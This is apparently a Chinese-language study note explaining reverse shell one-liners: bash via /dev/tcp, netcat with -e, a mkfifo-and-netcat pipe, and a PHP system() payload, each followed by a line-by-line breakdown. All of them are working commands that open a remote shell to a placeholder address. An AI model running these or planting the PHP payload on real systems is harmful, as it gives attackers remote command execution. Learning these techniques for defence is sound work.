## bash反弹shell

```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

### 解析：

- bash -i：
  - bash是Bash shell的命令
  - -i：表示以交互模式启动Bash，允许用户输入命令并获取输出。
  - 作用：启动一个交互式的shell
- \>& /dev/tcp/<ip>/<port>：
  - /dev/tcp/<ip>/<port>：是Bash的一个特殊文件（虚拟设备），用于直接通过TCP连接到指定的IP和端口
  - \>&：表示将标准输出和标准错误重定向到指定的目标
  - 作用：将Bash的输出（包括命令结果和错误信息）发送到远程主机的<ip>:<port>
- 0>&1：
  - 0：表示标准输入
  - \>&1：将标准输入重定向到标准输出
  - 作用：因为标准输出已经被重定向到/dev/tcp/<ip>/<port>，这一步将标准输入也绑定到同一个TCP连接上，确保远程主机发送的命令可以通过该连接输入到Bash。







## nc反弹shell

```
nc -e /bin/bash <ip> <port>
```

### 解析：

- -e /bin/bash：-e是nc的一个选项，表示将指定程序绑定到网络连接上（这里是/bin/bash)
- /bin/bash是一个shell解释器，执行该选项后，nc会将网络连接的输入和输出与/bin/bash的标准输入出书绑定
- 作用：允许远程通过网络执行shell命令

### 注意事项：

- 不是所有的nc版本都支持-e选项

- 如果-e不被支持，可以利用管道方式解决

  - ```
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f
    ```

    







## php代码中利用system()函数弹shell

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f");?>
```

### 解析：

- rm /tmp/f
  - 删除文件/tmp/f（如果存在）
  - 目的：确保后续操作不好因为文件已存在而失败，清理环境
- mkdifo /tmp/f
  - 创建一个命名管道（FIFO，First-In-First-Out）文件/tmp/f
  - 命名管道：这是一个特殊的文件类型，允许数据在进程之间传递。数据写入管道的一端可以被另一端读取
  - 目的：为后续的数据流传输准备一个管道
- cat /tmp/f | /bin/sh -i 2>&1
  - cat /tmp/f：读取命名管道/tmp/f中的内容
  - | ：将cat的内容通过管道传递给后面的命令
  - /bin/sh -i：启动一个交互式的shell（-i表示交互模式）
  - 2>&1：将标准错误重定向到标准输出，确保错误信息也能被传递
  - 作用：从管道中读取数据并将其传递给交互式shell，同时将shell的输出（包括错误）合并
- | nc <ip> <port> > /tmp/f
  - |：将前面的shell输出传递给nc命令
  - nc <ip> <port>：使用nc连接到ip及端口
  - \> /tmp/f：将nc的输出（即从远程接收到的数据）写入到命名管道/tmp/f。
  - 作用：将shell的输出通过网络发送到远程主机，同时将远程主机的命令写回管道，形成双向通信

### 整体工作原理：

- 创建管道：通过mkfifo创建/tmp/f作为数据中转站。
- 反弹shell：
  - cat /tmp/f：读取管道中的数据（攻击者的命令）
  - /bin/sh -i：执行这些命令并生成输出
  - nc <ip> <port> 将shell的输出发送到攻击者的ip和端口
  - 攻击者发送的额命令通过nc写回/tmp/f，形成循环。
- 结果：攻击者开启监听，就可以与目标主机上的shell交互，执行任意命令
